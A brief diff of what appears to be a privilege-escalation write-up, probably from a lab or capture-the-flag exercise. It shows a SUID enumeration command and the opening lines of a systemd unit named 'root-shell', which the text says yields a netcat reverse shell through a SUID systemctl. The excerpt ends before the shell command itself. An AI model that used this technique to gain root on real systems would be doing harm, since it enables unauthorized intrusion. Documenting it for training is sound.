@@ -40,7 +40,8 @@ find / -perm /4000
 /bin/systemctl
 ```
 
-Exploiting systemctl, reverse shell using netcat openbsd from systemctl service.
+#### Priviledge escuation
+Reverse shell using netcat openbsd from systemctl service.
 ```bash
 [Unit]
 Description=root-shell
